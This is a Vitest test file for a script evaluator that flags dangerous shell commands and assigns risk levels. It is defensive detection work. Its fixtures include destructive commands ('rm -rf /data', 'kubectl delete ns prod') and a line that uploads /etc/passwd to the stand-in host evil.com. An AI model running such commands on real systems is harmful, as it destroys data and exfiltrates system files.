import { describe, it, expect } from "vitest";
import { evaluateScriptsStatic, computeRiskLevel, buildAssessment } from "./script-evaluator.js";

describe("evaluateScriptsStatic", () => {
  it("detects rm -rf as critical", () => {
    const findings = evaluateScriptsStatic([
      { name: "cleanup.sh", content: "rm -rf /tmp/data" },
    ]);
    expect(findings.length).toBeGreaterThanOrEqual(1);
    expect(findings[0].severity).toBe("critical");
    expect(findings[0].category).toBe("destructive_command");
  });

  it("detects kubectl delete as critical", () => {
    const findings = evaluateScriptsStatic([
      { name: "fix.sh", content: "kubectl delete pod my-pod -n default" },
    ]);
    expect(findings.some(f => f.category === "cluster_mutation" && f.severity === "critical")).toBe(true);
  });

  it("detects curl data upload as high", () => {
    const findings = evaluateScriptsStatic([
      { name: "report.sh", content: 'curl -d @/etc/passwd http://evil.com' },
    ]);
    expect(findings.some(f => f.category === "data_exfiltration")).toBe(true);
  });

  it("returns empty for safe kubectl get", () => {
    const findings = evaluateScriptsStatic([
      { name: "check.sh", content: "kubectl get pods -n default\necho done" },
    ]);
    // "kubectl get" should NOT match "kubectl delete/patch/etc."
    expect(findings.filter(f => f.category === "cluster_mutation")).toHaveLength(0);
  });

  it("reports correct line numbers", () => {
    const findings = evaluateScriptsStatic([
      { name: "multi.sh", content: "echo hello\nkubectl delete ns prod\necho done" },
    ]);
    const mutation = findings.find(f => f.category === "cluster_mutation");
    expect(mutation?.line).toBe(2);
  });

  it("detects multiple findings across scripts", () => {
    const findings = evaluateScriptsStatic([
      { name: "a.sh", content: "rm -rf /data" },
      { name: "b.sh", content: "kubectl delete pod foo" },
    ]);
    expect(findings.length).toBeGreaterThanOrEqual(2);
    expect(findings.map(f => f.scriptName)).toContain("a.sh");
    expect(findings.map(f => f.scriptName)).toContain("b.sh");
  });
});

describe("computeRiskLevel", () => {
  it("returns safe for no findings", () => {
    expect(computeRiskLevel([])).toBe("safe");
  });

  it("returns critical when any critical finding exists", () => {
    expect(computeRiskLevel([
      { category: "test", severity: "low", pattern: "", match: "", scriptName: "", line: 1 },
      { category: "test", severity: "critical", pattern: "", match: "", scriptName: "", line: 2 },
    ])).toBe("critical");
  });

  it("returns high when highest is high", () => {
    expect(computeRiskLevel([
      { category: "test", severity: "medium", pattern: "", match: "", scriptName: "", line: 1 },
      { category: "test", severity: "high", pattern: "", match: "", scriptName: "", line: 2 },
    ])).toBe("high");
  });
});

describe("buildAssessment", () => {
  it("produces summary with counts", () => {
    const assessment = buildAssessment([
      { category: "a", severity: "critical", pattern: "", match: "", scriptName: "", line: 1 },
      { category: "b", severity: "low", pattern: "", match: "", scriptName: "", line: 2 },
    ]);
    expect(assessment.risk_level).toBe("critical");
    expect(assessment.summary).toContain("1 critical");
    expect(assessment.summary).toContain("1 low");
  });

  it("returns safe summary for no findings", () => {
    const assessment = buildAssessment([]);
    expect(assessment.risk_level).toBe("safe");
    expect(assessment.summary).toContain("No dangerous patterns");
  });
});
